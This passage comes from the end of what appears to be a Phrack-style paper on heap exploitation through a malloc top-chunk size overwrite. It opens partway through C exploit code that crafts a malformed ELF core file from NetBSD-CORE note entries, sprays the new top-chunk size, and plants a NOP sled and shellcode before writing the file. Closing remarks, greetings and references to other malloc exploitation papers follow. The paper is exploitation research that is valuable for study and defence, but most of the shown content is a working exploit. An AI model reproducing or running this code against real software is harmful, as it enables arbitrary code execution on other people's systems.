    ptr = buffer + OFFSET_N_BYTES + 12;
    sprintf (ptr, "NetBSD-CORE");
    for (i = 0; i < (math->nname % 31); i++)
        buffer[OFFSET_N_BYTES+24+0x7c+i]='B';


    // This note entry lets us eat 0 bytes + overhead
    elfnhdr = (Elf32_Nhdr *) (buffer + OFFSET_0_BYTES);
    elfnhdr->n_namesz       = 12;
    elfnhdr->n_descsz       = 12;
    elfnhdr->n_type         = 1;
    ptr = buffer + OFFSET_0_BYTES + 12;
    sprintf (ptr, "NetBSD-CORE");
    buffer[OFFSET_0_BYTES+24+0x7c]=0;


    // This note entry lets us specify the value that will
    // overwrite the topchunk size
    elfnhdr = (Elf32_Nhdr *) (buffer + OFFSET_OVERWRITE);
    elfnhdr->n_namesz       = 12;
    elfnhdr->n_descsz       = 12;
    elfnhdr->n_type         = 1;
    ptr = buffer + OFFSET_OVERWRITE + 12;
    sprintf (ptr, "NetBSD-CORE");
    // Put the new topchunk size 7 times in memory
    // The note entry program name is at a specific, odd offset (24+0x7c)?
    for (i = 0; i < 7; i++)
        put_longword (buffer + OFFSET_OVERWRITE + 24 + 0x7c + (i * 4),
            topchunk_size);


    // This note entry lets us eat 31 bytes + overhead, but
    // its real purpose is to load the shellcode in memory.
    // We assume that its name is 31 bytes long.
    elfnhdr = (Elf32_Nhdr *) (buffer + OFFSET_SHELLCODE);
    elfnhdr->n_namesz       = 12;
    elfnhdr->n_descsz       = 12;
    elfnhdr->n_type         = 1;
    ptr = buffer + OFFSET_SHELLCODE + 12;
    sprintf (ptr, "NetBSD-CORE");
    sprintf (buffer + OFFSET_SHELLCODE + 24 + 0x7c,
         "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB");


    // Fill this memory region with our shellcode.
    // Remember to leave the note entry untouched ...
    memset (buffer + OFFSET_SHELLCODE + 256, 0x90, 4096-256);
    sprintf (buffer + 8191 - strlen (scode), scode);


    fp = open_file (filename);
    if (fwrite (buffer, 8192, 1, fp) != 0 ) {
        printf ("--[ The file has been written\n");
    } else {
        printf ("--[ Can not write to the file\n");
        exit (1);
    }
    fclose (fp);


    free (shead);
    free (math);
    free (buffer);
    free (filename);


    return 0;
}


--[ 7 - Final words

That's all for the details of this technique; a lot has already been said
through this paper.  By looking at the complexity of the malloc code, there
are probably many other ways to take control of a process by corrupting the
malloc chunks.

Of course, this paper explains the technical details of set_head, but
personally, I think that all the exploitation techniques are ephemeral.
This is more true, especially recently, with all the low level security
controls that were added to the modern operating systems.  Beside having
great technical skills, I personally think it's important to develop your
mental skills and your creativity.  Try to improve your attitude when
solving a difficult problem.  Develop your perseverance and determination,
even though you may have failed at the same thing 20, 50 or 100 times in a
row.

I would like to greet the following individuals: bond, dp, jinx,
Michael and nitr0gen.  There is more people that I forget. Thanks for the
help and the great conversations we had over the last few years.


--[ 8 - References

1. Solar Designer, http://www.openwall.com/advisories/OW-002-netscape-jpeg/

2. Anonymous, http://www.phrack.org/archives/57/p57-0x09

3. Kaempf, Michel, http://www.phrack.org/archives/57/p57-0x08

4. Phantasmal Phantasmagoria,
http://www.packetstormsecurity.org/papers/attack/MallocMaleficarum.txt

5. Phantasmal Phantasmagoria,
http://seclists.org/vuln-dev/2004/Feb/0025.html

6. jp,
http://www.phrack.org/archives/61/p61-0x06_Advanced_malloc_exploits.txt

7. Guay-Leroux, Jean-Sebastien, http://www.guay-leroux.com/projects.html

8. gera, http://www.phrack.org/archives/59/p59-0x07.txt

9. The Shellcoder's Handbook: Discovering and Exploiting Security Holes
(2004), Wiley
